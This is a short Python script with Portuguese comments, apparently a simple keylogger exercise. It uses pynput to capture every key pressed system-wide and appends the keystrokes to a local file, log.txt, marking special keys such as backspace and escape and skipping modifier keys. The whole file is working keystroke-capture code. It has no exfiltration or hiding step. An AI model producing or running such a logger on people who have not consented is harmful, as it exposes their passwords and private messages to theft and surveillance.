
from pynput import keyboard
# conjunto de teclas que serão ignoradas e não registradas no log
IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt,
    keyboard.Key.alt_r,
    keyboard.Key.cmd,
    keyboard.Key.caps_lock,
}
#função que é chamada toda vez que uma tecla é pressionada
def on_press(key):
    try:
        #se for uma tecla normal do tipo 'a', 'b', '1', etc
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)

    #teclas especiais do tipo Key.space, Key.enter, etc
    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write("[BACKSPACE]")
            elif key == keyboard.Key.esc:
                f.write("[ESC]")
            elif key in IGNORAR:
                pass
            else:
                f.write(f"[{key}]")

# Inicia o listener de teclado
try:
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
except KeyboardInterrupt:
    print("\nPrograma encerrado pelo usuário.")